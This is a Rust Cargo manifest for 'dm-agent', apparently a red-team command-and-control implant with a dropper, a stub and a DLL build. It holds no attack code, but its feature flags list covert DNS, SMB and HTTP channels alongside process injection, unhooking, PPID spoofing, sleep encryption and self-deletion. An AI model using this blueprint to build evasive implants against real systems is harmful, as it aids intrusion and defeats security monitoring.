[package]
name    = "dm-agent"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "dm-agent"
path = "src/main.rs"

[lib]
name = "dm_agent_dll"
path = "src/dll_main.rs"
crate-type = ["cdylib"]

[[bin]]
name = "dm-dropper"
path = "src/dropper_main.rs"

[[bin]]
name = "dm-stub"
path = "src/bin/dm-stub.rs"

# Build-time configuration injected by the build service
# These are set via environment variables when building a specific payload.
# Default values here are for local development only.

[features]
default        = ["channel-winhttp"]
channel-winhttp = []
channel-https  = ["ureq", "rustls"]
channel-dns    = []
channel-smb    = []
channel-tcp    = []
sleep-encrypt = []

# Evasion features — enabled by the build service per engagement
process-hollow = []

# Phase 3 injection techniques
inject-classic = []
inject-apc     = []
inject-hollow  = []
inject-hijack  = []
inject-stomp   = []
unhook         = []
ppid-spoof     = []
heap-encrypt   = []
stack-spoof    = []
udrl           = []
self-delete    = []
dll-sideload   = []
packer-stub    = []

[dependencies]
# Crypto
aes-gcm    = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
chacha20   = { version = "0.9", default-features = false }
p256       = { version = "0.13", default-features = false, features = ["ecdh"] }
rand       = { version = "0.8", default-features = false, features = ["getrandom"] }
sha2       = { version = "0.10", default-features = false }
hkdf       = { version = "0.12", default-features = false }
zeroize    = { version = "1.7", features = ["zeroize_derive"] }

# HTTP (legacy ureq/rustls channel — only included when channel-https feature is enabled)
ureq    = { version = "2.9", optional = true, default-features = false, features = ["tls", "json"] }
rustls  = { version = "0.23", optional = true, default-features = false, features = ["ring", "tls12", "std"] }

# Serialization
serde      = { version = "1", features = ["derive"] }
serde_json = { version = "1" }

# Utilities
base64     = { version = "0.22" }
uuid       = { version = "1.8", features = ["v4"] }

[target.'cfg(unix)'.dependencies]
libc = { version = "0.2", default-features = false }

[target.'cfg(windows)'.dependencies]
# Windows API bindings — raw, no CRT dependency
windows-sys = { version = "0.52", features = [
    "Win32_Foundation",
    "Win32_System_Threading",
    "Win32_System_Memory",
    "Win32_Security",
    "Win32_Security_Credentials",
    "Win32_System_LibraryLoader",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_System_SystemInformation",
    "Win32_System_Services",
    "Win32_System_DataExchange",
    "Win32_Networking_WinSock",
    "Win32_Graphics_Gdi",
    "Win32_UI_WindowsAndMessaging",
    "Win32_Storage_FileSystem",
    "Win32_System_Pipes",
    "Win32_System_ProcessStatus",
    "Win32_System_IO",
    "Win32_System_Kernel",
    "Win32_System_Time",
    "Win32_Networking_WinHttp",
] }

[profile.release]
opt-level     = "z"
lto           = true
codegen-units = 1
strip         = true
panic         = "abort"

[build-dependencies]
# Build script reads env vars injected by the build service
